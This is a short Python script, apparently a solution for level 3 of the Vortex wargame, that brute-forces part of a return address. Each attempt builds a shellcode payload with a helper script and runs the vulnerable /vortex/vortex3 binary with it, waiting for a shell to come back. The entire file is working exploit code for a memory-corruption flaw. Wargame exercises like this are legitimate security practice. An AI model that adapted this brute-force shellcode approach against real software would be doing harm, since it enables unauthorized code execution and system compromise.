import subprocess

# shellcode generating  script
script = "/tmp/myv3.py"

#found good addr = "\x8c\x92\x04\x08"

# Brute force the second part of the address space
for i in range (1, 256):
    for j in range (1, 256):
        addr = "%c%c\x04\x08" % (chr(i), chr (j))
        print "Trying addr: ", "".join('\\x%02x' % ord(c) for c in addr)
        
        # payload = shellcode + addr 
        # payload = `python /tmp/myv3.py "\x41\x42\x43\x44"`
        payload = subprocess.check_output(["python", script, addr])

        # pipe = os.popen("cmd", 'r', bufsize)
        p = subprocess.Popen(['/vortex/vortex3', payload])
        
        # block for successful shell
        p.wait()
